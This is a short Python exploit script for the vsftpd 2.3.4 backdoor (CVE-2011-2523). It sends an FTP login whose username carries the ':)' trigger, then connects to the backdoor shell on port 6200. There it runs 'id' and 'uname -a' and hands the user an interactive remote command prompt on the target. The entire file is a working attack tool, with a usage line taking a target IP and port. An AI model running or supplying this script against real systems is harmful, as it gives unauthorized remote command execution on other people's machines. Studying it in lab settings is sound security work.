#!/bin/python3

import socket
from time import sleep
from sys import argv as _arg_


def main():
    core = {
        "TREGER": {
            "USER": b"USER Melicious:)\n",
            "PASS": b"PASS anything\n"
        },
        "PRINT": {
            "SUCCESS": "[*] Conection status\t[ok]",
            "FAIL": "\n[!] Conection status\t[FAIL]",
            "HEADER": "Vsftpd 2.3.4 is Vulnerable to Backdoor Command Execution on port 6200\n[ CVE-2011-2523 ]Repoted : March 2 2011\n",
            "PROMPT": "Command: "
        },
        "ENCODE": "UTF-8",
        "SIZE": 11024,
        "BACK_DOOR_PORT": 6200,
        "TIME": 1.5
    }
    try:
        VSFTP234 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        VSFTP234.connect((_arg_[1], int(_arg_[2])))
        print(core["PRINT"]["HEADER"]+"\n"+core["PRINT"]["SUCCESS"])
        VSFTP234.send(core["TREGER"]["USER"])
        VSFTP234.send(core["TREGER"]["PASS"])
        VSFTP234.close()
        sleep(core["TIME"])
        VSFTP234 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        VSFTP234.connect((_arg_[1], core["BACK_DOOR_PORT"]))
        VSFTP234.send(b"id\nuname -a\n")
        print(VSFTP234.recv(core["SIZE"]).decode(core["ENCODE"]), end='')
        print(VSFTP234.recv(core["SIZE"]).decode(core["ENCODE"]), end='')
        while True:
            VSFTP234.send((input(core["PRINT"]["PROMPT"])+"\n").encode(core["ENCODE"]))
            print(VSFTP234.recv(core["SIZE"]).decode(core["ENCODE"]), end='')
        VSFTP234.close()
    except:
        print(core["PRINT"]["FAIL"])


try:
    if __name__ == '__main__' and _arg_[1] != _arg_[2]:
        main()
except:
    print(f"python3 {_arg_[0]}  <Target_Ip> <PORT> ")

# Thanks !
